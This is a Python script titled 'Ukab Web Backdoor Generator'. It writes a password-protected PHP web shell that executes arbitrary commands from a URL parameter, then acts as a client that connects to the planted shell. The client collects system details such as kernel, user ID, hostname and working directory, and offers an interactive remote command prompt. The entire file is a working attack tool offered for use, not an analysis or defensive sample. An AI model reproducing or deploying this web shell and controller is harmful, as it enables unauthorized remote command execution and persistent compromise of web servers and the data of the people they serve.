import os
import hashlib
import urllib.request
import requests
clear = lambda: os.system('clear')
clear()
print('\x1b[36m','''
         _
 .---.  / > .---,
  <_  `'  `'  _>
    <_/\  /\_>
       |`'|
      ".__."
''','\x1b[0m')
print(
'\x1b[1m','| Ukab Web Backdoor Generator (Uno)','\x1b[0m',
'\n\x1b[1m','| Barbarian © 1439,2018','\x1b[0m')
print('''
 [1] Create Backdoor
 [2] Connect To Backdoor
 [3] About
''')

MainChoose = input(' ->> ')
def NewBackdoor():
    Name = input('[*] Choose Backdoor Name (ex : /home/user/bck.php) : ')
    Pass = input('[*] Choose Password : ')
    MD5password = hashlib.sha256(Pass.encode()).hexdigest()
    print('[+] Crypt your password as SHA256,')
    Backdoor_php = open(Name, 'w')
    BackdoorCode = """<?php
$SHAPass = '"""+MD5password+"""';
if (hash('sha256', $_GET['pass']) == $SHAPass)
{
  echo base64_decode('V2UxYzBtZQ==');
  $Output = exec($_GET['shell'].' 2>&1', $out);
  echo implode('\n', $out);
  echo base64_decode('RTMzb3I=');

}
elseif (md5($_GET['pass']) != $SHAPass)
{
  echo 'Wrong Password ,';
}
?>"""
    Backdoor_php.write(BackdoorCode)
    Backdoor_php.close()
    print('[+] Your backdoor Has Been Created. ')
def Connect():
    BackdoorURL = input("[*] Enter Backdoor URL (with HTTP) : ")
    Password = input("[*] Enter Backdoor Password : ")
    URL = BackdoorURL+"?pass="+Password
    ImportURL = urllib.request.urlopen(URL, timeout=10).read()
    if 'We1c0me' in str(ImportURL):
        print('[+] Connected Succefuly . .')
        Kernal = str(urllib.request.urlopen(URL+"&shell=uname%20-a").read()).split("We1c0me")[1].split("E33or")[0]
        Perrmision = str(urllib.request.urlopen(URL+"&shell=id").read()).split("We1c0me")[1].split("E33or")[0]
        pwd = str(urllib.request.urlopen(URL+"&shell=pwd").read()).split("We1c0me")[1].split("E33or")[0]
        print('\n[ '+Kernal)
        print('[ '+Perrmision)
        print('[ '+pwd)
        hostname = str(urllib.request.urlopen(URL+"&shell=hostname").read()).split("We1c0me")[1].split("E33or")[0]
        whoami = str(urllib.request.urlopen(URL+"&shell=whoami").read()).split("We1c0me")[1].split("E33or")[0]
        Execute = input("\n[\x1b[32m"+whoami+"\x1b[0m@\x1b[32m"+hostname+"\x1b[0m] $ ").replace(' ','%20')
        while Execute != str(''):
            Execute = input("\n[\x1b[32m"+whoami+"\x1b[0m@\x1b[32m"+hostname+"\x1b[0m] $ ").replace(' ','%20')
            Output = str(urllib.request.urlopen(URL+"&shell="+Execute).read()).split('We1c0me')[1].split("E33or")[0]
            print("\n"+Output.replace('\\n','\n'))
    elif 'Wrong' in str(ImportURL):
        print('[-] Wrong Password. ')
    else:
        print('[-] Somthing Wrong')
def About():
    print('\x1b[37m','''
| Ukab (UNO) remote php_backdoor connector urllib based,
| Email   : l.etat@bk.ru
| Github  : @islamique
| Twitter : @Ba3bar
                     ''','\x1b[0m')
if MainChoose == '1':
    NewBackdoor()
elif MainChoose == '2':
    Connect()
elif MainChoose == '3':
    About()
